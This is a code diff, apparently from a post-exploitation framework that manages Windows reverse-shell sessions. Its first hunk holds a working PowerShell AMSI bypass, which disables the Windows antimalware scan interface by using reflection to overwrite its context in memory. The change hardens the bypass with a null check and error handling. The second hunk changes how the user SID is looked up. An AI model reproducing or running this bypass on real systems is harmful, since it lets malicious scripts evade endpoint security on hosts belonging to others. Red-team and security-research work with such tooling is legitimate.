@@ -591,9 +591,12 @@ function prompt {
         self.host_uuid = self.channel.recvline().strip().decode("utf-8")
 
         # Bypass AMSI
-        self.powershell(
-            """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);"""
-        )
+        try:
+            self.powershell(
+                """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0); if( $ptr -ne $null -and $ptr -ne 0 ) { [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); }"""
+            )
+        except PowershellError as exc:
+            self.session.log("[yellow]warning[/yellow]: failed to disable AMSI!")
 
     def get_pty(self):
         """ We don't need to do this for windows """
@@ -830,11 +833,8 @@ function prompt {
     def refresh_uid(self):
         """ Retrieve the current user ID """
 
-        self.powershell(
-            "Add-Type -AssemblyName System.DirectoryServices.AccountManagement"
-        )
         self.user_info = self.powershell(
-            "([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).SID.Value"
+            "[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value"
         )[0]
 
     def getuid(self):
